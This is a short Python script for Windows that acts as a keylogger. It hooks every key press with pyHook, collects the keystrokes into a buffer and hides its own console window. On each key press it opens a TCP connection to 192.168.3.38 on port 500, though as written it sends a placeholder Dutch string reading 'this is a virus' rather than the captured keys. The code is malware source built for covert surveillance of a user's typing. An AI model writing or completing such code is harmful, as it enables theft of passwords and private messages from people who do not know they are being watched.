#!/usr/bin/python
import  pyHook, pythoncom
import socket

import os
import time
import pathlib

data=''
HOST_IP="192.168.3.38"
def SendToRemoteServer():
    global data
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST_IP, 500))
    malware=("DIT IS EEN VIRUS".encode('utf-8'))
    sock.send(malware)
    sock.close()
    return True

def HideCmd():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def GetKeyPressedAndSendIt(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys
    HideCmd()
    SendToRemoteServer()


hm = pyHook.HookManager()
hm.KeyDown = GetKeyPressedAndSendIt
hm.HookKeyboard()
pythoncom.PumpMessages()
